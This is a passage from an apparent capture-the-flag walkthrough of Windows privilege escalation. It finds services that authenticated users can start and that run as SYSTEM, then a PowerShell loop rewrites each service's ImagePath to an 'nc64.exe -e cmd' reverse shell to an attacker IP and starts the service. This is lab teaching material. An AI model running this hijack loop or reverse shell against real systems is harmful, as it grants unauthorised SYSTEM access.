PimIndexMaintenanceSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
PimIndexMaintenanceSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
PrintWorkflowUserSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-5-21-2702878673-795188819-444038987-2781)
PrintWorkflowUserSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-15-3-1024-4044835139-2658482041-3127973164-329287231-3865880861-1938685643-461067658-1087000422)(A;;CCLCSWRPWPDTLOCRRC;;;S-1-5-21-2702878673-795188819-444038987-2781)
RasMan D:(A;;CCLCSWRPLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPLOCRRC;;;S-1-15-3-1024-1068037383-729401668-2768096886-125909118-1680096985-174794564-3112554050-3241210738)
seclogon D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPDTLOCRRC;;;IU)(A;;CCLCSWDTLOCRRC;;;SU)(A;;CCLCSWRPDTLOCRRC;;;AU)
SstpSvc D:(A;;CCLCSWRPLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;NO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPLOCRRC;;;S-1-15-3-1024-1068037383-729401668-2768096886-125909118-1680096985-174794564-3112554050-3241210738)
UevAgentService D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)
UnistoreSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
UnistoreSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
UserDataSvc D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
UserDataSvc_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
WaaSMedicSvc D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)
WinHttpAutoProxySvc D:(A;;CCLCSWRPLOSDRC;;;SY)(A;;CCLCSWRPLOSDRC;;;BA)(A;;CCLCSWRPLORC;;;AU)(A;;CCLCSWRPLORC;;;IU)(A;;CCLCSWRPLORC;;;SU)(A;;LCRPLO;;;AC)(A;;LCRPLO;;;S-1-15-3-1)(A;;LCRPLO;;;S-1-15-3-2)(A;;LCRPLO;;;S-1-15-3-3)
WpnUserService D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
WpnUserService_4d27d D:(A;;CCLCSWRPWPDTLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;AC)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
wuauserv D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)

```

I can get a cleaner list by just printing the service:

```

PS C:\> $startable = foreach ($service in $services) { $sddl = (cmd /c sc sdshow $service)[1]; if ($sddl -match "RP[A-Z]*?;;;AU") { write-host $service }}
AppVClient              
ConsentUxUserSvc
ConsentUxUserSvc_4d27d                  
DevicePickerUserSvc
DevicePickerUserSvc_4d27d
DevicesFlowUserSvc
DevicesFlowUserSvc_4d27d                
DoSvc     
PimIndexMaintenanceSvc
PimIndexMaintenanceSvc_4d27d
PrintWorkflowUserSvc                    
PrintWorkflowUserSvc_4d27d
RasMan
seclogon
SstpSvc
UevAgentService
UnistoreSvc                       
UnistoreSvc_4d27d
UserDataSvc
UserDataSvc_4d27d
WaaSMedicSvc
WinHttpAutoProxySvc
WpnUserService
WpnUserService_4d27d
wuauserv

```

### Enumeration for SYSTEM

The other thing I want is that the service be running as SYSTEM. I can check that in the registry, looking for `LocalSystem` in the `ObjectName` parameter in PowerShell. For example, `DoSvc` does not seem to run as SYSTEM:

```

PS C:\> (gp -path hklm:\system\currentcontrolset\services\DoSvc).ObjectName
NT Authority\NetworkService

```

Whereas `UserDataSvc` does:

```

PS C:\> (gp -path hklm:\system\currentcontrolset\services\UserDataSvc).ObjectName
LocalSystem

```

I’ll add that check to my search. To show the code, I’ll expand it here:

```

foreach ($service in $services) { 
  $sddl = (cmd /c sc sdshow $service)[1]; 
  $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
  if ($sddl -match "RP[A-Z]*?;;;AU" -and $reg.ObjectName -eq "LocalSystem") { 
    write-host $service
  }
}

```

That will loop over each service, and for each get the registry key and the sddl. Then only if the SDDL matches the regex *and* the `ObjectName` is `LocalSystem` will it print the result:

```

PS C:\> foreach ($service in $services) { $sddl = (cmd /c sc sdshow $service)[1]; $reg = gp -path hklm:\system\currentcontrolset\services\$service; if ($sddl -match "RP[A-Z]*?;;;AU" -and $reg.ObjectName -eq "LocalSystem") { write-host $service }}
AppVClient
ConsentUxUserSvc
DevicePickerUserSvc
DevicesFlowUserSvc
PimIndexMaintenanceSvc
PrintWorkflowUserSvc
RasMan
seclogon
UevAgentService
UnistoreSvc
UserDataSvc
WaaSMedicSvc
WpnUserService
wuauserv

```

### Exploit Loop = Shell

For some reason, the first couple of these I tried didn’t work. From here, I just decided to try them all. Here’s the expanded code:

```

foreach ($service in $services) { 
  $sddl = (cmd /c sc sdshow $service)[1]; 
  $reg = gp -path hklm:\system\currentcontrolset\services\$service; 
  if ($sddl -match "RP[A-Z]*?;;;AU" -and $reg.ObjectName -eq "LocalSystem") { 
    write-host "Trying to hijack $service"; 
    $old_path = (get-itemproperty HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; 
    set-itemproperty -erroraction silentlycontinue -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.4 443"; 
    start-service $service -erroraction silentlycontinue; 
    set-itemproperty -path HKLM:\system\currentcontrolset\services\$service -name imagepath -value $old_path 
  }
}

```

It starts just like the loop above, but when the conditions match, instead of writing the service name, it writes a message, then gets the old value for the service binary. Then it sets that path to `nc.exe` connecting back to me. It then starts the service, and the puts the original bin path back.

When I run this, when it gets to `seclogon`, I get a shell:

[![screenshot of shell coming in](https://0xdfimages.gitlab.io/img/image-20200423170843330.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200423170843330.png)

I don’t know why the others don’t work (please leave a comment if you do). I also can’t explain why I get an error trying to write to `RasMan`. But, I have a shell as SYSTEM. If I break out of the shell and restart the listener, it also works for `wuauserv`.

### Stable Shell

When starting `nc.exe` as a service, it will die after a minute or so. To keep a stable shell, I just started a second listener on 444. When the first one connected, I just ran `nc.exe` from it, and that new process connects back as SYSTEM and will live past the first minute.

![image-20200423171258354](https://0xdfimages.gitlab.io/img/image-20200423171258354.png)

From there, I’ll grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
8f8613f5************************

```